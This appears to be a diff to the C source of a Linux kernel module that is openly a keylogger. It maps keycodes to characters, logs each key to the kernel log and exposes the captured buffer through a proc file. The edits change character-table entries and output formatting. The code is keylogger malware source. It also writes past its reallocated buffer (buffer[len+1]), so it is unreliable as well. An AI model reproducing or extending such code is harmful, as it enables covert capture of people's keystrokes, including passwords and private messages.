@@ -16,18 +16,17 @@ static size_t len;
 static struct proc_dir_entry* key_file;
 
 const char CH_TABLE[] = {
-    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
-    '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
-    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
-    'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'
+    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '?',
+    '?', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '?',
+    'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '?', 'X',
+    'X', '?', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', 'z'
 };
 
 static int file_show(struct seq_file *m, void *v)
 {
     buffer = krealloc( buffer, len + 1, GFP_KERNEL);
     buffer[len+1] = '\0';
-    seq_printf(m, "Keylogger: %s\n", buffer);
-    
+    seq_printf(m, "Keylogger: %s \n", buffer);
     return 0;
 }
 
@@ -85,7 +84,7 @@ static char decode_key(int keycode) {
     buffer = krealloc( buffer, len + 1, GFP_KERNEL);
     len++;
     if(char_index >= 0 && char_index < sizeof(CH_TABLE)){
-        printk(KERN_INFO "Key %c", CH_TABLE[char_index]);
+        printk(KERN_INFO "Key %c \n", CH_TABLE[char_index]);
         buffer[len + 1] = CH_TABLE[char_index];
         return CH_TABLE[char_index];
     }else{
